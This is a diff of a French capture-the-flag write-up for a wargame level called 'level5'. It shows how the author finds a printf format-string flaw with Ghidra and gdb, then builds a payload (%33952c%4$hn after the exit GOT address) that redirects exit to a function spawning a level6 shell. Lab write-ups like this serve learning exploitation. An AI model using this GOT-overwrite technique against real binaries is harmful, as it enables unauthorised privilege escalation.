@@ -4,11 +4,33 @@ On a un executable qui se lance avec les droits de notre user cible:
 En copiant cet executable sur ma machine hote, je peux le passer au logiciel ghidra afin de l'analyser.
 
 Je remarque que:
+> une fonction o lance un shell
+> la fonction n appelle la fonction printf de maniere non securisee
+> la fonction n sort en appellant la fonction exit
 
+Afin d'exploiter ce binaire, je dois modifier l'entree de la GOT pour exit de maniere à ce qu'elle pointe vers o.
 
-> l'adresse de o est 0x080484a4
-
-
+Pour construire le playload, il me faut:
+> l'adresse de o, qui est 0x080484a4
 > l'adresse de la fonction exit dans la GOT : 0x08049838
 objdump -R ./level5 | grep -w exit
 08049838 R_386_JUMP_SLOT   exit
+> l'emplacement du debut de la chaine dans la stack
+gdb ./level5 
+b *n+49
+run
+AAAA
+0xbffff4f0:     0xbffff500      0x00000200      0xb7fd1ac0      0xb7ff37d0
+0xbffff500:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
+0xbffff510:     0xbffff568      0xb7fde2d4      0xb7fde334      0x00000007
+Le debut de la chaine est en 4e position dans la stack avant l'appel à printf.
+
+Je vais commencer par placer l'adresse d'exit en little-endian (\x38\x98\x04\x08)
+Ensuite, je vais essayer de modifier cettre adresse pour qu'elle pointe vers o plutôt que exit.
+Je veux donc inscrire 0x080484a4 à la place de 0x08049838.
+Je remarque que les 2 octets de poids fort de l'adresse sont les mêmes, je vais donc me concentrer sur les 2 octets de poids faible:
+Je veux donc ecrire 84a4 (33956 en décimal) au 4e emplacement de la stack, le format string est le suivant:
+> j'imprime 33952 (33956 - 4) caracteres => %33952c
+> j'ecris le nombre de caractères imprimés à la 4e position de la stack => %4$hn
+
+Ce payload lance effectivement la fonction o à la place de la fonction exit et me donne accès à un shell de level6
